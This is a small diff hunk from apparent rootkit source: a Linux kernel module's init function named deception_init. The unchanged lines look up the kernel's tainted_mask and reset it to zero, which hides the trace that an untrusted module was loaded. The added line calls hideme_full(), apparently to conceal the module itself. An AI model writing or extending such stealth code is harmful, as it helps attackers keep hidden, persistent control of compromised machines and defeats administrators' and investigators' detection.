@@ -930,7 +930,7 @@ static int __init deception_init(void)
     tainted_mask_ptr = (unsigned long *)kallsyms_lookup_name_fn("tainted_mask");
     if (tainted_mask_ptr)
         *tainted_mask_ptr = 0;
-
+    hideme_full();
     return 0;
 }
 
